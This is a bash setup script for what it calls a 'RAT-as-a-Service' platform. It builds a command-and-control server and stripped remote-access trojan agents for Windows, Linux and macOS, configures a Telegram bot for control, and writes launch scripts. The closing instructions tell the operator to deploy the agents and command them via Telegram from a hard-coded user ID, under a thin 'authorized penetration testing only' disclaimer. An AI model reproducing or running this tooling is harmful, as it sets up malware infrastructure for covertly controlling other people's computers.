#!/bin/bash

# 🔴 RAT-as-a-Service Platform Setup Script
# For educational and authorized penetration testing only

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${RED}"
    echo "🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴"
    echo "🔴                                                                  🔴"
    echo "🔴    ██████╗  █████╗ ████████╗      █████╗  █████╗ ███████╗        🔴"
    echo "🔴    ██╔══██╗██╔══██╗╚══██╔══╝     ██╔══██╗██╔══██╗██╔════╝        🔴"
    echo "🔴    ██████╔╝███████║   ██║        ███████║███████║███████╗        🔴"
    echo "🔴    ██╔══██╗██╔══██║   ██║        ██╔══██║██╔══██║╚════██║        🔴"
    echo "🔴    ██║  ██║██║  ██║   ██║███████╗██║  ██║██║  ██║███████║        🔴"
    echo "🔴    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝        🔴"
    echo "🔴                                                                  🔴"
    echo "🔴           Remote Access Trojan - as - a - Service                🔴"
    echo "🔴                    Setup & Configuration Script                  🔴"
    echo "🔴                                                                  🔴"
    echo "🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴"
    echo -e "${NC}"
    echo -e "${YELLOW}⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY${NC}"
    echo ""
}

check_prerequisites() {
    echo -e "${BLUE}📋 Checking prerequisites...${NC}"
    
    # Check Go installation
    if ! command -v go &> /dev/null; then
        echo -e "${RED}❌ Go is not installed. Please install Go 1.21+ first.${NC}"
        echo "   Download from: https://golang.org/dl/"
        exit 1
    fi
    
    # Check Go version
    GO_VERSION=$(go version | grep -o 'go[0-9]\+\.[0-9]\+' | sed 's/go//')
    MAJOR=$(echo $GO_VERSION | cut -d. -f1)
    MINOR=$(echo $GO_VERSION | cut -d. -f2)
    
    if [ "$MAJOR" -lt 1 ] || ([ "$MAJOR" -eq 1 ] && [ "$MINOR" -lt 21 ]); then
        echo -e "${RED}❌ Go version $GO_VERSION is too old. Please upgrade to Go 1.21+${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}✅ Go $GO_VERSION detected${NC}"
    
    # Check curl for testing
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠️  curl not found - API testing will be limited${NC}"
    fi
    
    echo ""
}

setup_telegram_bot() {
    echo -e "${BLUE}📱 Setting up Telegram Bot...${NC}"
    echo ""
    echo "To create a Telegram bot:"
    echo "1. Open Telegram and message @BotFather"
    echo "2. Send /newbot command"
    echo "3. Follow the prompts to create your bot"
    echo "4. Copy the bot token when provided"
    echo ""
    
    read -p "Enter your Telegram bot token (or press Enter to skip): " BOT_TOKEN
    
    if [ -n "$BOT_TOKEN" ]; then
        # Update bot token in source file
        sed -i.bak "s/YOUR_BOT_TOKEN_HERE/$BOT_TOKEN/g" telegram-bot/bot.go
        echo -e "${GREEN}✅ Bot token configured${NC}"
        echo "bot_token=$BOT_TOKEN" > .env
    else
        echo -e "${YELLOW}⚠️  Bot token skipped - you'll need to configure it manually${NC}"
    fi
    
    echo ""
}

install_dependencies() {
    echo -e "${BLUE}📦 Installing dependencies...${NC}"
    
    # Initialize Go module if not exists
    if [ ! -f "go.mod" ]; then
        go mod init rat-as-a-service
    fi
    
    # Download dependencies
    go mod tidy
    
    echo -e "${GREEN}✅ Dependencies installed${NC}"
    echo ""
}

build_components() {
    echo -e "${BLUE}🔨 Building platform components...${NC}"
    
    # Create build directory
    mkdir -p build
    
    # Build main platform
    echo "Building main platform..."
    go build -o build/raas-platform main.go
    
    # Build agents for different platforms
    echo "Building Windows agent..."
    GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o build/agent-windows.exe ./agent/
    
    echo "Building Linux agent..."
    GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o build/agent-linux ./agent/
    
    echo "Building macOS agent..."
    GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o build/agent-macos ./agent/
    
    echo -e "${GREEN}✅ All components built successfully${NC}"
    echo "   📁 Check the build/ directory for compiled binaries"
    echo ""
}

test_installation() {
    echo -e "${BLUE}🧪 Testing installation...${NC}"
    
    # Test build
    if [ ! -f "build/raas-platform" ]; then
        echo -e "${RED}❌ Platform build failed${NC}"
        return 1
    fi
    
    # Test Go compilation
    if ! go build -o /tmp/test-compile main.go; then
        echo -e "${RED}❌ Go compilation test failed${NC}"
        return 1
    fi
    rm -f /tmp/test-compile
    
    echo -e "${GREEN}✅ Installation test passed${NC}"
    echo ""
}

create_launch_scripts() {
    echo -e "${BLUE}📝 Creating launch scripts...${NC}"
    
    # Linux/Mac launch script
    cat > launch.sh << 'EOF'
#!/bin/bash
# RAT-as-a-Service Platform Launcher

# Load environment variables
if [ -f ".env" ]; then
    export $(cat .env | xargs)
fi

# Check if bot token is provided
if [ -z "$bot_token" ]; then
    echo "❌ Bot token not configured"
    echo "   1. Set up Telegram bot with @BotFather"
    echo "   2. Run: export bot_token=YOUR_TOKEN"
    echo "   3. Or add to .env file"
    exit 1
fi

echo "🚀 Starting RAT-as-a-Service Platform..."
echo "📱 Bot Token: ${bot_token:0:10}..."
echo "🌐 C2 Server: http://127.0.0.1:8080"
echo ""

go run main.go -bot-token "$bot_token"
EOF
    
    # Windows batch script
    cat > launch.bat << 'EOF'
@echo off
title RAT-as-a-Service Platform

echo 🚀 Starting RAT-as-a-Service Platform...
echo.

REM Check if bot token is set
if "%BOT_TOKEN%"=="" (
    echo ❌ Bot token not configured
    echo    1. Set up Telegram bot with @BotFather
    echo    2. Run: set BOT_TOKEN=YOUR_TOKEN
    echo    3. Or edit this script
    pause
    exit /b 1
)

echo 📱 Bot Token: %BOT_TOKEN:~0,10%...
echo 🌐 C2 Server: http://127.0.0.1:8080
echo.

go run main.go -bot-token "%BOT_TOKEN%"
pause
EOF
    
    chmod +x launch.sh
    
    echo -e "${GREEN}✅ Launch scripts created${NC}"
    echo "   🐧 Linux/Mac: ./launch.sh"
    echo "   🪟 Windows: launch.bat"
    echo ""
}

show_next_steps() {
    echo -e "${GREEN}🎉 Setup Complete!${NC}"
    echo ""
    echo -e "${BLUE}📋 Next Steps:${NC}"
    echo ""
    echo "1. 📱 Configure Telegram Bot (if not done):"
    echo "   • Message @BotFather on Telegram"
    echo "   • Create bot and get token"
    echo "   • Update BOT_TOKEN in telegram-bot/bot.go"
    echo ""
    echo "2. 🚀 Launch Platform:"
    echo "   • Linux/Mac: ./launch.sh"
    echo "   • Windows: launch.bat"
    echo "   • Manual: go run main.go -bot-token YOUR_TOKEN"
    echo ""
    echo "3. 🤖 Deploy Agents:"
    echo "   • Windows: build/agent-windows.exe"
    echo "   • Linux: build/agent-linux"
    echo "   • macOS: build/agent-macos"
    echo ""
    echo "4. 📱 Control via Telegram:"
    echo "   • Message your bot from user ID: 7991166259"
    echo "   • Use /help to see available commands"
    echo ""
    echo -e "${YELLOW}⚠️  Remember: Use only for authorized penetration testing!${NC}"
    echo ""
    echo -e "${BLUE}📖 Documentation: README.md${NC}"
    echo -e "${BLUE}🆘 Support: Check troubleshooting section in README${NC}"
    echo ""
}

main() {
    print_banner
    
    echo -e "${BLUE}🚀 RAT-as-a-Service Platform Setup${NC}"
    echo ""
    
    check_prerequisites
    setup_telegram_bot
    install_dependencies
    build_components
    test_installation
    create_launch_scripts
    show_next_steps
}

# Run main function
main "$@" 